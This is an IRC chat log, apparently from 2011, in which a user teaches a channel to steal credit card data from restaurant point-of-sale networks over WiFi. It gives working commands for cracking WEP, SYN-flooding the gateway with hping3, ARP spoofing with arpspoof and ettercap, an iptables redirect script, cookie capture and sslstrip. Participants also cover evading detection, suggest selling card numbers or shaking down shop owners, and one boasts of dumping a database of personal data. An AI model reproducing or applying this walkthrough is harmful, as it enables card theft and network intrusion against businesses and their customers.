@@ -1,0 +1,626 @@
+Wardriving POS 101 (by Snafu)
+
+<Snafu> Yaay
+<Snafu> I got some interesting shit
+<Mutiny> did the peanuts show up in it
+<Mutiny> ?
+<Mutiny> or the corn?
+* EmilyPlays (d5770f7b@LulzCo-5910E532.mibbit.com) has joined #school4lulz
+<Snafu> figured id bring it here from the lulzsec room
+<Snafu> Wifi_101
+<Snafu> So here we go
+<Mutiny> #shitjokes
+* Dorpher has quit (Quit: Rizon webchat: http://qchat.rizon.net/)
+<Snafu> This is from my observations in the US, not sure how other countries are
+<Snafu> This encompasses PCI DSS and WIFI networks attached to POS networks
+<Snafu> So there ya are, wardriving
+<Snafu> You see an ESSID that matches the business name….Well use Subway for this lesson
+<EmilyPlays> Hai guize
+<Snafu> Subway because its very common there…..they franchise..
+<Snafu> Anyways
+<Snafu> Most subways have a wifi network so the owner can check his corporate emails and such
+<Snafu> And of course, the dude will follow whatever is recommended
+<Snafu> Hell if u check the verizon mifis they RECOMMEND wep
+<Snafu> wtf right?
+<Snafu> So anyways
+<Snafu> If yer lucky, youll find a WEP encryption
+<Snafu> Now
+<Snafu> How do you know if you have gotten a proper network ?
+<Snafu> Find the gateway (cough) 192.168.1.1 most likely
+<Mutiny> Another neat fact… Technician installed AT&T routers at home locations are by default not encrypted at all.
+<Snafu> then syn flood it with hping3 or whatever
+<Snafu> Anyone not familiar with syn floods?
+<Snafu> anyone curious how to syn flood?
+<iyobe> yes
+<hjax> sort of
+<Snafu> Okay
+<Snafu> Moving on
+<Snafu> So
+<Snafu> Syn flood the router
+<Snafu> Now, for this method, u need to be in view of the register
+<Snafu> Not fam with synf loods?
+<Snafu> sb1
+<Snafu> i dont memorize it
+<Snafu> one sec
+<Snafu> hping -i u1 -S -p 80 dst-host-or-ip
+<Snafu> ie
+<d0z3> nice
+<Snafu> hping -i u1 -S -p 80 192.168.1.1
+<turnigy> whos to say it would take down the service?
+<Snafu> hping –help to learn what the option syntaxes are
+<Snafu> A syn flood?
+<Snafu> Gimme yer IP =)
+<Snafu> ill show ya
+<Snafu> =)
+<d0z3> whats the purpose ? taking it down ?
+<Snafu> Alright, now with that being said, You have to view the register
+<crklol> >2011
+<crklol> >syn flood
+<Snafu> Set up the command, but dont hit enter yet
+<Snafu> U dont want to cause suspicious activity
+<Snafu> wait till someone is getting rdy to pay
+<Snafu> watch what they pull out of their wallet
+<Snafu> If its plastic
+<Snafu> begin the flood
+<hjax> what are we using the syn flood against?
+* wa- has quit ()
+<d0z3> the gw of the lan
+<Snafu> if they swipe multiple times….yer good
+<Snafu> stop the flood
+<Snafu> the gateway
+<Snafu> To prevent traffic from leaving the local subnet
+<Snafu> ie
+<Snafu> the 16 digit credit card number
+<hjax> at a store?
+<d0z3> subway store, hacked wifi, youre on the wifi
+<Snafu> So anyways, what youll normally get is a 16-yr old cashier with pimples and a confused look because they have to keep swiping the card, and its not working, but they arent getting errors
+<Snafu> Most of the time, they will hit the reader because they are unintelligent
+<d0z3> lol
+<Snafu> As soon as you see the confused look, or multiple swipes, Probably both at the same time
+<Snafu> STOP the syn flood
+<hjax> lol
+<Snafu> Do not DDoS the network, or they might call in a technician
+<d0z3> the suspense, i can’t hold myself
+<d0z3> so.. arp spoof ? :d
+<hjax> it would totally lock up the network? fun
+<Snafu> after youve verified that the syn flood stops transactions…..MITM via arpspoof or whatever
+<d0z3> yay arpspoof :d
+<Snafu> yep
+<d0z3> cain!
+<Snafu> nice d0z3
+<Snafu> oh yeah
+<Snafu> syn fludz are fun
+<crklol> ethreal
+<Snafu> so now what u need to do is find the mac of the reader
+<xoxo> (i’m logging this)
+<Snafu> so u cause less traffic than a mass arp
+<Snafu> ie
+* Bob_Robster (~Bob_Robst@C7189919.712D1C05.C199F532.IP) has joined #school4lulz
+<Snafu> you dont want to slow down the store owners child porn downloads
+<Snafu> go for it
+<Snafu> =)
+<Snafu> he might get suspicious
+<Snafu> so for those who dont know
+<Snafu> apt-get install arpspoof
+<Snafu> arpspoof -i wlan0 -t 192.168.1.2 192.168.1.1
+* iro (~iro@LulzCo-226F28F8.dynamic.chello.sk) has joined #school4lulz
+* xoxo has quit (Quit: Leaving)
+<Snafu> -t is the target
+<turnigy> snafu, getting the mac of the reader? nmap?
+<Snafu> Now, heres the trick
+<Snafu> that is a one way spoof
+* Bob_Robster has quit ()
+<Snafu> yep
+* ryan1918 has quit (Remote host closed the connection)
+<Snafu> or ettercap
+<Snafu> or both
+<Snafu> whatever =)
+* xoxo (~xoxo@EB88FA99.F20FE4F0.3582744B.IP) has joined #school4lulz
+<Snafu> many methods here
+<Snafu> Let me backup a bit
+<d0z3> heh i’m glad i run the wifi in a seperate vlan at work :p
+<Snafu> nmap 192.168.1.0/24 -sn
+<hjax> what would happen if i tested it against my home network? just stop traffic for my entire family?
+<Mutiny> or try to login to the gw using the default information XD
+<Snafu> that does a ping sweep on the network
+<xoxo> (could somebody paste the lines I missed? it’s for the loggin’)
+<Snafu> I can briefly recap
+<Snafu> Thatll be good
+<Snafu> cuz im getting lost in my thoughts reading everybodies questions
+<crklol> xoxo,
+<crklol> * xoxo è uscito (Quit: Leaving)
+<crklol> <Snafu> -t is the target
+<crklol> <turnigy> snafu, getting the mac of the reader? nmap?
+<crklol> <Snafu> Now, heres the trick
+<crklol> <Snafu> that is a one way spoof
+<crklol> * Bob_Robster è uscito ()
+<crklol> <Snafu> yep
+<crklol> * ryan1918 è uscito (Remote host closed the connection)
+<crklol> <Snafu> or ettercap
+<crklol> <Snafu> or both
+* ryan1918 (~ryan@7016F228.B696884D.7E210C26.IP) has joined #school4lulz
+<crklol> <Snafu> whatever =)
+<Snafu> coo, thanks crklol
+<crklol> np
+<xoxo> i’m gonna sync it up a lil
+<Snafu> grabbing a dip, one sec, afk
+<Snafu> ill just backtrack a bit
+* bob has quit (Quit: laters)
+<Snafu> thatll make it make sense
+<Snafu> now that i see what questions i missed, order is always nice
+<Snafu> 123 instead of 1583737 then 2
+<Snafu> so
+* sublimepua has quit (Ping timeout: 240 seconds)
+<Snafu> WEP and POS networks
+<Snafu> we could speak WPA, but why not go for the low hanging fruit
+<d0z3> (use airocrack or cafe late)
+<Snafu> Do some wardriving
+<Snafu> find a network with an ESSID that matches the business (this is so you dont hit the wrong people and waste time)
+<Snafu> ie subways
+<Snafu> they are always almost normally improper setup per PCI DSS rules
+<Snafu> thats the payment card industry
+<Snafu> Data security standards
+<Snafu> fun rules
+<Snafu> 5000 dollar a day fines for improper networks with wifi
+<Snafu> Okay
+<Snafu> So
+<Snafu> U find a subway with wep
+<Snafu> u can also use signal strength to determine a network
+<Snafu> whatever
+<Snafu> crack the wep open like an egg…..then
+<Snafu> yer gunna need to test if the wifi is on the POS part of the network
+<Snafu> How to do this is by syn flooding the gateway
+<Snafu> most networks thats the 192.168.1.1
+<Snafu> to find it another way would be to ipconfig /all
+<Snafu> in windows
+<Snafu> or route -en in *nix
+<Snafu> if u dont know what a gateway is, well, google =)
+<turnigy> tip: if you don’t, forget this.
+<Snafu> so, you need to prevent traffic from going out of the network
+<Snafu> to do this create a syn flood
+<Snafu> via hping or whatever method
+<Snafu> i use hping
+<Snafu> it works
+<Snafu> field tested
+<Snafu> hping3 to be exact
+<Snafu> here is the syntax
+<Snafu> hping -i u1 -S -p 80 dst-host-or-ip
+<Snafu> where dst-host-or-ip is the gateways ip
+<Snafu> hping –help to figure out what the optional syntaxes are
+<Snafu> i choose port 80 because the router will normally have 80 open so that the owner can surf the kiddie pr0n
+<Snafu> So
+<Snafu> With yer handy netbook, grab u a sandwich, sit down, eat for a bit, and then wait for someone to get rdy to pay
+<Snafu> have the commands typed already
+<Snafu> watch what thye pull out
+<Snafu> if its plastic begin the flood
+<Snafu> The effect is instantenous
+<Snafu> so dont have it running for long
+<Snafu> the goal is NOT TO DDoS at this point
+<Snafu> maybe later
+<Snafu> but not now
+<Snafu> So, if u see the clerk swipe more than once and have a confused look on his face
+<Snafu> U got it
+<Snafu> The reader wont show errors because it is transmitting properly
+<Snafu> itll say Waiting on confirmation or whatever
+<Snafu> because it is sending the data up the pipe
+<Snafu> So thats where u get the confused look from
+<Snafu> cuz normally its like 4-5 seconds for a response with a cat5 cable hooked in
+<Snafu> longer if its telephonics, but then it prolly wouldnt work anyways cuz its not on the subnet of the wifi
+<Snafu> so after you have seen multiple swipes, stop the flood
+<Snafu> dont wait too long
+<Snafu> or the customer will pull out cash
+<Snafu> or a diff card
+<Snafu> all about timing
+<Snafu> you want to see that u delay it
+<Snafu> and then see that the same card goes through
+<hjax> what would happen if theres more than one cash register?
+<Snafu> thats the litmus test part of it
+<Snafu> Good question
+<Snafu> Never thought about it like that
+<crklol> wait, isnt the shit of the card cripted?
+<hjax> would it lock up all of them?
+<Snafu> but since youll be syn flooding the gateway
+<Snafu> it shouldnt matter
+<Snafu> itll prevent traffic from leaving…..maybe not coming, but def leaving
+<Snafu> Yep
+<Snafu> SSL
+<Snafu> but theres a cure thanks to moxie marlinspike
+<Snafu> but thats later
+<Snafu> ..
+<Snafu> Okay so
+<Snafu> You have verified that the WiFi is the same subnet as the POS
+* jester[znc] is now known as jester
+<Snafu> Yep
+<Snafu> totally prevent traffic outgoing
+<Snafu> never done intensive syn flood testing to see what happens to all machines outbound/inbound
+<Snafu> but it definately prevents outbound traffic
+<Snafu> okay so
+<Snafu> Now you need the MACs of the gateway and the readers
+<Snafu> i suggest: nmap 192.168.1.0/24 -sn
+<Snafu> assuming its a 192.168.1.1 type networks
+<Snafu> use whatever works for u
+<Snafu> then using a mac looker upper
+<Snafu> google “mac address lookup”
+<Snafu> first or second hit is the page u need
+<Snafu> either way
+<d0z3> cant u just arp -a since you just pinged ?
+<kratos> ^
+<Snafu> the firs 6 digits of the hex addie are the manufacturer
+<Snafu> u could
+<Snafu> but u only attacked the gateway
+<Snafu> not the reader
+<d0z3> yeah but you did an nmap ping sweep
+<Snafu> so why would u have arp traffic to the reader?
+<d0z3> so you arp’ed every ip
+<d0z3> and should have gotten a reply
+<Snafu> =)
+* ratch3t (~androirc@LulzCo-FC117E60.sub-174-253-235.myvzw.com) has joined #school4lulz
+<Snafu> Oh
+* ratch3t has quit ()
+<kratos> or you could use hping and ethereal to craft an arp req and cap the reply
+<Snafu> thought u meant after the flood
+<Snafu> yes
+<Snafu> You are correct
+<Snafu> figured u meant dir after the synflood, vs after the nmap sweep
+<Snafu> method is not important
+<Snafu> What u need is a list of macs on the subnet
+<Snafu> after u got them
+<d0z3> after the nmap 
+<d0z3> ok
+<Snafu> look for ones that arent laptop normal
+<Snafu> ie
+<Snafu> hell i cant even think of one now
+<Snafu> but it wont be atheros or hp etc…
+<Snafu> so using those macs
+<Snafu> take the first 6 digits of the 12 digit address
+<turnigy> nmap does a good job of figuring it out, what device etc
+<Snafu> and look em up
+<Snafu> when u find one that deals with POS, u got a target
+<Snafu> sometimes
+<Snafu> but yer only -sn it
+<Snafu> So
+<Snafu> Now you have the mac of the gateway and any card readers
+<Snafu> Really you only need to do a oneway spoof
+* tzaki has quit (Quit: Leaving)
+<Snafu> from the reader to the gateway
+* Zion has quit (Ping timeout: 240 seconds)
+<Snafu> but if you want other infos
+<Snafu> youll need a twoway
+* zdanthrax has quit (Quit: Leaving)
+<xoxo> Snafu: could you give the command for spoofing?
+<Snafu> ettercap -Tq -i wlan0 -M arp:remote /192.168.1.1/ /192.168.1.3/
+<xoxo> ty
+<Snafu> arpspoof -i wlan0 -t 192.168.1.3 192.168.1.1
+<Snafu> thats a one way though
+<Snafu> ettercap -Tq -i wlan0 -M arp:remote /192.168.1.1/ /192.168.1.3/
+<Snafu> would be twoway
+<Snafu> which is more ideal
+<Snafu> and you see both sides of the equation
+<Snafu> vs just the traffic FROM the reader
+<Snafu> or using ettercap for a oneway woudl be this way
+<Snafu> ettercap -Tq -i wlan0 -M arp:oneway /192.168.1.1/ /192.168.1.3/
+<Snafu> okay so, now with the twoway being recommended
+<Snafu> Ah, forgot
+<Snafu> The reason i use ettercap is for packet forwarding purposes
+<Snafu> If you are using arpspoof u have to do it manually
+<Snafu> with this method
+* leak has quit ()
+<Snafu> #!/bin/bash
+<Snafu> #Not using the old ways anymore, ettercap all the way
+<Snafu> #echo “1″ > /proc/sys/net/ipv4/ip_forward
+<Snafu> echo “Define Forwarding Port”
+<Snafu> read a
+<Snafu> iptables -t nat -A PREROUTING -p tcp –destination-port 80 -j REDIRECT –to-port $a
+<turnigy> everyone should know this…but to add, change your freaking mac first
+<Snafu> exit
+<Snafu> theres my script
+<nachash> And preferably use a wifi card you don’t care about, in addition to changing your mac.
+<Snafu> ah wait
+<Snafu> hmm
+<Snafu> yes u are right turnigy
+<Snafu> we are teaching =)
+<Snafu> Change yer hostname too
+<Snafu> thatll be in the logz
+<Snafu> as well
+<nachash> There’s no such thing as paranoia.
+<crklol> ettercap rules
+<Snafu> Okay so backing up just a bit here
+<Snafu> You need to enable packet forwarding, OR you will DOS whatever u are spoofing
+<Snafu> echo “1″ > /proc/sys/net/ipv4/ip_forward
+<Snafu> to enable packet forwarding
+* TimmyTingles has quit (Remote host closed the connection)
+<Snafu> But, if u use the above script, youll see where i talk about ettercap and its commented out
+<Snafu> So i dont really use arpspoof
+<Snafu> cuz ettercap is more powerful
+<Snafu> either way
+<kratos> if you use iptables, you’ll need to p
+<kratos> ermit forwarding as well
+<Snafu> Ah, a note
+<Snafu> If you use arpspoof
+<Snafu> and want to read the dumps with Ettercaps -T option (text)
+<Snafu> make sure you invoke the unoffensive
+<Snafu> You do not want to forward twice
+<Snafu> My iptables are defaulted kratos
+<Snafu> so im not sure what ya mean
+<Snafu> how i do forwarding is the echo “1″ > /proc/sys/net/ipv4/ip_forward
+<Snafu> i dont issue any iptables commands to do it
+<Snafu> Do u know something i dont sir?
+<kratos> the forward chain must be set to ACCEPT
+<Snafu> and yeah xoxo ill kick when finished
+<Snafu> hmm
+<kratos> just a mention
+<Snafu> never had a problem in ubuntu or backtrack
+<kratos> i use complex firewalls though 
+<kratos> and DENY all generally
+<Snafu> ah
+<kratos> just something to watch out for
+<Snafu> I dont use any when attacking
+* gaybaby (~g@yba.be) has joined #school4lulz
+<Snafu> takes elements out of the equation
+<Snafu> Okay
+<Snafu> Noddles
+<Snafu> So if you use firewalls
+<Snafu> make sure you dont prevent forwarding
+<Snafu> thats the lesson to get out of that
+<Snafu> Alright
+<Snafu> So
+<Snafu> a recap on the spoofing
+* turnigy has quit (Remote host closed the connection)
+<Snafu> if you use a method other than ettercap to spoof
+<Snafu> MAKE sure you enable packet forwarding
+<Snafu> In conjunction with that
+* janick (~qwerty@LulzCo-C71354B7.desu.edu) has joined #school4lulz
+<kratos> and if you have any trouble, check you have all the iptables modules compiled in your kernel
+<kratos> alongside ip forwarding
+<Snafu> make sure if you decide to read traffic with ettercaps -t option, and you have enabled forwarding via the echo “1″ > /proc/sys/net/ipv4/ip_forward
+<Snafu> that you set ettercap to Unoffensive
+<Snafu> this is in the man page for ettercap
+<Snafu> how to invoke ettercap unoffensively?
+<Snafu> ettercap -Tu
+<Snafu> Touche’ kratos
+* turnigy (~turnigy@9E450AF4.1F24E4E4.13FC21DA.IP) has joined #school4lulz
+<Snafu> Any questions so far?
+<Snafu> Sorry if this has been long winded…..
+<Snafu> alright
+<Snafu> Now, we are currently: mitm the router/gateway (2-way preferably)
+<phed> this db im dumping i think is looking well over 6k users in email/telephone/full name/address/password plus possibly other shit i cant see outside the scroll of the screen lol hopefull some cc in there
+<phed> all uk english twats lulz
+<Snafu> Next we want to do two things
+<Snafu> Grab authentication cookies
+<Snafu> And SSLStrip
+<jester> omg pheds
+<Snafu> To grab cookies, I like to use Ferret&Hamster
+<kratos> more of a #lulzsec topic there phed
+<Snafu> syntax on this is
+<Snafu> ferret -i wlan0
+<phed> do my bros not want some lootin first in here lol??
+<Snafu> open that in  a diff text window, cuz it will spam the screen with all sorts of chatter
+* ryan1918 has quit (Remote host closed the connection)
+<kratos> ssh, let Snafu teach
+<Snafu> but leave it running
+<Snafu> You might get some cool stuff….Specially if you arent just mitm the tgt and the gw, but the whole network
+<Snafu> Alright, now with ferret running
+<Snafu> Youll need to do some iptables configuring
+<Snafu> echo “Define Forwarding Port”
+<Snafu> read a
+<Snafu> iptables -t nat -A PREROUTING -p tcp –destination-port 80 -j REDIRECT –to-port $a
+<Snafu> exit
+<Snafu> you can script it if you like
+<Snafu> I left off the top half for simplicitys sake, cuz i talk about using ettercap and such
+* sublimepua (~sublimepu@LulzCo-693EDEBE.maine.res.rr.com) has joined #school4lulz
+* curi0us (~bogatash@LulzCo-A73C7FF1.nycap.res.rr.com) has joined #school4lulz
+* ryan1918 (~ryan@7016F228.B696884D.7E210C26.IP) has joined #school4lulz
+* curi0us has quit ()
+<Snafu> Aright, with that command, its going to move yer packets from 443 over to 80
+<Snafu> using SSLStrip
+<Snafu> anyone here not used sslstrip?
+<Snafu> anyone here used it?
+<crklol> never used it
+<crklol> seems cool
+<Snafu> Moving on.
+<Snafu> Heh
+<Snafu> Its a blast
+<Snafu> sb1
+<Snafu> wget http://www.thoughtcrime.org/software/sslstrip/sslstrip-0.7.tar.gz \ python setup.py install
+<Snafu> the \ python setup.py install is for once youve gunziped and untarred
+<Snafu> and cd’d to the dir
+<Snafu> gotta use the pisser
+<Snafu> brb
+<gaybaby> WHOOP THERE IT IS
+<gaybaby> WHOOP THERE IT IS
+<gaybaby> WHOOP THERE IT IS
+<gaybaby> WHOOP THERE IT IS
+<gaybaby> WHOOP THERE IT IS
+<gaybaby> WHOOP THERE IT IS
+<gaybaby> WHOOP THERE IT IS
+<gaybaby> WHOOP THERE IT IS
+<gaybaby> WHOOP THERE IT IS
+<gaybaby> WHOOP THERE IT IS
+<crklol> pussy
+<crklol> pussy
+<d0z3> stfu
+<Odysseus> kick ban pls
+* r0yale (~r0yale@LulzCo-C1DBF51B.ok.ok.cox.net) has joined #school4lulz
+<xoxo> GUYS
+<xoxo> Stop
+<Mutiny> Eh, let them have their fun now, since snafu is afk 
+<Snafu> wow
+<Snafu> definately gay
+<xoxo> haha 
+<Snafu> alright
+<xoxo> Mutiny: but it fucks up the log you know
+<Mutiny> i retract that statement
+<Snafu> SSLStrip
+<Mutiny> you can cut it out
+<crklol> (you should put +m here=
+<crklol> *)
+<Snafu> It makes port 443 port 80 by some magik
+* r0yale (~r0yale@LulzCo-C1DBF51B.ok.ok.cox.net) has left #school4lulz
+<Snafu> anyone know why we want 80 vs 443?
+<Snafu> 80 is cleartxt =)
+<Mutiny> 80 is standard open for http
+<Mutiny> ?
+<Mutiny> i was wrong.
+<Snafu> so are other fun ports….23…etc
+<Snafu> Yep
+<Snafu> but its also cleartext
+<Snafu> Yer proper Mutiny
+<Snafu> it is http standard
+<Snafu> What does http do though with “user info”?
+<Snafu> Sends it cleartext across the wire
+<kratos> you could open an ssl server on port 80 but your browser would go insane
+<Snafu> If this was my network i’d show you a dump of an sslstrip extract, but its not mine to mess with right now
+<d0z3> um its not coz you portforward 443 to 80 thats its gonna get decoded .. ?
+<Snafu> This applies to ANY network and ANY situation, not just subway wep networks with a POS attached
+<Snafu> well, 443 is standard for https
+* transient (~transient@LulzCo-2E403794.jetstream.xtra.co.nz) has joined #school4lulz
+<kratos> via sslstrip d0z3
+<d0z3> ah k
+<Snafu> which uses ssl for encryption
+<hatter> http://www.nytimes.com/2011/06/12/world/12internet.html?_r=1&pagewanted=1&partner=rss&emc=rss interesting.
+* iwrg9jh (~sifaujasg@LulzCo-81798442.tampabay.res.rr.com) has joined #school4lulz
+<crklol> not sure how ssl can be decripted however
+<Snafu> It doesnt
+<d0z3> so your gonna give the cardreader a new ssl cert ?
+<iwrg9jh> decrypted*
+<KroaK> its doesn’t
+* iro has quit (Read error: Connection reset by peer)
+<Snafu> SSLstrip is magik bro
+<Snafu> nope
+<KroaK> it give the victim a fake ssl cert
+<d0z3> ok thought so
+<Snafu> this is not like ettercaps fake ssl cert shit
+<d0z3> real mitm
+<crklol> ah ok KroaK
+<Snafu> This is a redirector
+<turnigy> most users will click ok to security warnings in browser
+<turnigy> 
+<Snafu> the victim doesnt see ANYTHING
+<kratos> http://www.thoughtcrime.org/software/sslstrip/
+<Snafu> in this case, they dont get the warning
+<d0z3> this isn’t a user but an embedded device 
+<Snafu> yep
+<Snafu> Moxie
+<crklol> but didnt the app “for the card” need to accept the NEW cert?
+<Snafu> Awesome
+<Snafu> Noddles
+<Snafu> which is why we cant use fake ssl replacement here
+<Snafu> we need the reader not to be asked questions
+<Snafu> SSLStrip works like this
+* hjax has quit (Quit: http://www.mibbit.com ajax IRC Client)
+* Gilbert (~vvvvv@BA76605B.334318CF.B14CD96.IP) has joined #school4lulz
+<crklol> >mfw
+* lincoln (~AndChat@LulzCo-65F95419.sub-174-255-178.myvzw.com) has joined #school4lulz
+<Snafu> It makes the server think its talking on SSL to the end user
+<Snafu> Which it is
+<Snafu> It Fools the tgt into accepting http
+<Snafu> versus https
+<d0z3> hm
+<Snafu> if you saw it in a browser youd understand what i mean
+<Snafu> and moxie explains it better on the website
+<Snafu> def read into it, prior to use, so yer not just skiddie here
+<d0z3> didn’t know that would work
+<Snafu> Whats that d0z3?
+* Tully_ has quit (Read error: Connection reset by peer)
+* exidous has quit (Read error: Connection reset by peer)
+<d0z3> so in essence it just doenst offer a cert to the client so the client will not start ssl ?
+* Tully_ (Tully@LulzCo-F36D22A1.bcstcmta01.clsttx.tl.dh.suddenlink.net) has joined #school4lulz
+<Snafu> Yeah, but without triggering any browser warnings….
+* Tully_ has quit (Read error: Connection reset by peer)
+* Tully_ (Tully@LulzCo-F36D22A1.bcstcmta01.clsttx.tl.dh.suddenlink.net) has joined #school4lulz
+<d0z3> k cool
+<Snafu> Theres even an option to insert a fake favicon lock =)
+<Snafu> -f
+<d0z3> there goes tully again
+* six28 (~joulujoha@LulzCo-D0AA549E.range86-161.btcentralplus.com) has joined #school4lulz
+* Tully_ has quit (Read error: Connection reset by peer)
+<Snafu> Im going to pastebin my sslstrip script
+<crklol> but, why should It forwart to 80? isnt enought the fake cert to decript all?
+* Tully_ (Tully@LulzCo-F36D22A1.bcstcmta01.clsttx.tl.dh.suddenlink.net) has joined #school4lulz
+<Snafu> It has options that the man file doesnt
+<Snafu> U dont want a fake cert
+<Snafu> U dont want it to do SSL at all
+<Snafu> thats the point
+<Snafu> sb1 for pastebin
+<d0z3> whats sb1?  :p
+<Snafu> Pastebinning so you will see hidden options for ssl not talked about in the man or help file
+<Snafu> sslstrip that is
+<Snafu> standby 1 second
+<Snafu> =)
+<d0z3> k
+<Snafu> lord have mercy, satelite is sl0w
+<Snafu> still loading
+<Snafu> Damn afghanistan to hell
+<d0z3> lol ur in .af ?
+* exidous (~tt@LulzCo-87612D03.dsl.teksavvy.com) has joined #school4lulz
+<Snafu> yep
+* daquikniz (syncore@LulzCo-B0D1073A.us) has joined #school4lulz
+<Snafu> not .af though =)
+<Snafu> American
+<Snafu> Marine =)
+<Snafu> =/
+* Hyppo (~Robin@LulzCo-D9595ED.access.telenet.be) has joined #school4lulz
+<daquikniz> wut dis shit iz nigguh
+* hobes is now known as night
+<Snafu> http://pastebin.com/rTP3uUsL
+* SamiRi has quit (Ping timeout: 240 seconds)
+* Gilbert has quit (Remote host closed the connection)
+* HiThere (~ident@LulzCo-B9A9C274.dhcp.snlo.ca.charter.com) has joined #school4lulz
+<Snafu> K, check the pastebin for the options
+<d0z3> k
+<Snafu> 2) Log all SSL traffic TO and FROM server is the option u want
+<Snafu> 3) will show u the normal http traffic
+<Snafu> which is a helluva lot
+* Limit (~Limit@LulzCo-F78A6C2D.bb.sky.com) has joined #school4lulz
+<Snafu> if yer just logging card reader to gateway and back it wont be
+<Snafu> but this method applies to a lot more than just POS network s=)
+<Snafu> Alright
+<Snafu> So thats it
+<Snafu> wait for some card swipes
+<Snafu> TIME them
+<Snafu> then check out yer dumps in comparision to the time of swipe
+<Snafu> Tasty info there
+<Snafu> The next thing you can do
+* shivy (~shivy@LulzCo-5A3629A4.unitymediagroup.de) has joined #school4lulz
+<Snafu> Is to approach the owner…..
+<Snafu> Explain to em you see they are on WEP
+<d0z3> nah just use the cc numbers and sell them
+<Snafu> Talk about the TJ Maxx scandal from 05 or 06….I dont remember
+<Snafu> Let em know it cost tj maxx and marshall like millions of dollars
+<Snafu> grin
+<Snafu> that too
+<Snafu> then offer to “Fix” their network for a fraction of what a whitehat company would charge em
+<Snafu> Simply set em to WPA2 and they’re good
+<Snafu> takes 30 secs of yer time
+<Snafu> to make a could k
+<Snafu> couple k rather
+<Snafu> Any questions?
+<Snafu> kicked xoxo
+<Snafu> get it?
+<d0z3> too bad in my country cc is not so regular :p
+<d0z3> its all meastro here
+<Snafu> whats that?
+<d0z3> debit cards
+<xoxo> d0z3: are you in belgium,
+<xoxo> N
+<d0z3> xoxo sjjj
+* turnigy has quit ()
+<Snafu> oh, can you charge em as credit? or straight 4 digit pins?
+<xoxo> sjjjj?
+<d0z3> 4 digit pins :p
+<xoxo> Snafu: straight 4 digit
+<d0z3> xoxo are u ?
+<xoxo> d0z3: dunno. what about u?
+<Snafu> You know, with rfid enabled cards, and in conjunction with the method above
+<d0z3> :p
+<Snafu> you could clone the card
+<Snafu> and grab the pin via the method above =)
+<Snafu> anythings possible
+<Snafu> jackass companies using RFID for money cards….
+<d0z3> xoxo u have a azerty keyb so i assume u are :p
+<d0z3> havent heard about rfid cards
+* DevCore has quit (Quit: http://wix.com/aaronlingwood/omgwtfbbq Sydney HackerSpace)
+<Snafu> what!
+<Snafu> havent heard about easyswipes??
+<Snafu> its a little chip in the cards that is RFID
+
